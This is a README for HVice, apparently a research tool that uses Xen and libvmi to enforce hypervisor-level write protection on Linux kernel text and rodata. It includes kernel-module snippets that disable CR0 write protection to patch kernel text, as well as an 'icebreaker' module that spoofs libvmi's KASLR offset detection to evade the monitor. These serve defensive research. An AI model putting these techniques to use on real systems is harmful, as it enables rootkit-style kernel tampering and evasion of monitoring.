         ___         ___         ___
        /\  \       /\  \       /\  \
       _\:\  \     _\:\  \     _\:\  \
      /\/::\__\   /\/::\__\   /\/::\__\
      \::/\/__/   \::/\/__/   \::/\/__/
       \:\__\___   \:\__\___   \:\__\___
        \/__/\  \   \/__/\  \   \/__/\  \
           /::\  \     /::\  \     /::\  \
          /:/\:\__\   /:/\:\__\   /:/\:\__\
          \:\ \/__/   \:\ \/__/   \:\ \/__/
           \:\__\___   \:\__\___   \:\__\___
            \/__/\  \   \/__/\  \   \/__/\  \
               /::\  \     /::\  \     /::\  \
              /::\:\__\   /::\:\__\   /::\:\__\
              \:\:\/  /   \:\:\/  /   \:\:\/  /
               \:\/  /     \:\/  /     \:\/  /
                \/__/       \/__/       \/__/

                HVice
                intrusion countermeasure electronics v0.4

HVice is a proof of concept implementation of hypervisor enforced code/data integrity for the linux kernel using xen and libvmi.
it requires no modification to the guest OS.
HVice achieves this setting all pages between _text and _etext and all of kernel rodata to not writable in the guests EPT,
then pausing the VM and logging the violation if an attempted write did not come from within kernel text.
writes by code within kernel text are ignored to prevent false positives due to kernel self patching.


example:
    kernel self protection is insufficiently secure.
    despite recent kernel versions preventing writes to cr0 and setting protected pages as writeable via kernel functions,
    bypassing these protections is as simple as writing to either cr0 or the PTE directly as shown in this snippet.


``
        extern unsigned long __force_order ;
        inline void mywrite_cr0(unsigned long cr0) {
            asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
        }

        void disable_write_protection(void) {
            unsigned long cr0 = read_cr0();
            clear_bit(16, &cr0);
            mywrite_cr0(cr0);
        }

        static int __init cr0_write_init(void)
        {
            char **text = kallsyms_lookup_name_("_text");
            disable_write_protection();

            text[0] = 0x90; // overwrite first byte of kernel text with nop

            return 0;
        }
``

the above code will execute on an unprotected system but on a system protected with HVCIce, a violation is triggered and the vm is paused

``
        ICE: connecting to domain ubuntu-hvm... done
        ICE: init paging mode 4
        ICE: pausing vm... done
        ICE: kernel text start @ GVA ffffffff9be00000
                       @ GPA 16a00000
        ICE: kernel text end @ GVA ffffffff9ce02520
                     @ GPA 17a02520
        ICE: kernel rodata start @ GVA ffffffff9d000000
                         @ GPA 16a00000
        ICE: kernel rodata end @ GVA ffffffff9da8c000
                     @ GPA 17a02520
        ICE: range aligned to page boundaries (ffffffff9be00000 -> ffffffff9ce02000), 4098 frames
        ICE: registered mem_event on GVA range (ffffffff9be00000 -> ffffffff9ce02000)
        ICE: range aligned to page boundaries (ffffffff9d000000 -> ffffffff9da8c000), 2700 frames
        ICE: registered mem_event on GVA range (ffffffff9d000000 -> ffffffff9da8c000)
        ICE: VM resumed
        ICE: EPT write protection set on GVA ranges (ffffffff9be00000 -> ffffffff9ce02520)
        ICE:                                        (ffffffff9d000000 -> ffffffff9da8c000)
        ICE: waiting for violations...
        ICE: !! EPT WRITE VIOLATION @ GFN 16a00
        ICE:                        @ GPA 16a00000
        ICE:                        @ %RIP GVA 7fa8d9e7895f
        ICE:                          !! %RIP IS NOT IN KERNEL TEXT
        ICE: pausing vm...
``

icebreaker:
libvmi brute forces the KASLR offset by scanning the range of possible offsets and stopping when it finds a mapped address.
``
        static status_t get_kaslr_offset_ia32e(vmi_instance_t vmi)
        {
            addr_t va, pa;
            addr_t kernel_text_start = 0xffffffff81000000;
            addr_t kernel_text_end = kernel_text_start + (1024*1024*1024);

            linux_instance_t linux_instance = vmi->os_data;

            vmi->init_task = linux_instance->init_task_fixed;

            for (va = kernel_text_start; va < kernel_text_end; va += 0x200000) {
                if ( vmi_translate_kv2p(vmi, va, &pa) == VMI_SUCCESS ) {
                    linux_instance->kaslr_offset = va - kernel_text_start;
                    vmi->init_task += linux_instance->kaslr_offset;
                    dbprint(VMI_DEBUG_MISC, "**calculated KASLR offset in 64-bit mode: 0x%"PRIx64"\n", linux_instance->kaslr_offset);
                    return VMI_SUCCESS;
                }
            }
            return VMI_FAILURE;
        }
``

it is possible to spoof the offset with a kernel module in the guest that maps an address before the real KASLR kernel text start.
see: icebreaker/KASLR_spoof/KASLR_spoof.c
``
        pgd = pgd_offset(init_mm_ptr, SPOOFED_KERNEL_TEXT_START);

        p4d = p4d_alloc_(init_mm_ptr, pgd, SPOOFED_KERNEL_TEXT_START);
        if (!p4d) {
            return -ENOMEM;
        }

        pud = pud_alloc_(init_mm_ptr, p4d, SPOOFED_KERNEL_TEXT_START);
        if (!pud) {
            return -ENOMEM;
        }

        pmd = pmd_alloc_(init_mm_ptr, pud, SPOOFED_KERNEL_TEXT_START);
        if (!pmd) {
            return -ENOMEM;
        }

        ptep = pte_offset_map(pmd, SPOOFED_KERNEL_TEXT_START);

        uint64_t dummy_page = vmalloc(PAGE_SIZE);

        pte_t new_pte = pfn_pte(virt_to_phys(dummy_page) >> PAGE_SHIFT, PAGE_KERNEL);
        set_pte(ptep, new_pte);
``

todo:
    - icebreaker: libvmi brute-forces KASLR offset or uses init_task to calculate it, very easy to spoof
    - protect rodata (DONE)
    - protect important structures via sub-page write protection


compilation:
    gcc ICE.c -o ICE -lvmi -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -lglib-2.0 -g

usage:
    sudo ./ICE <domain name>
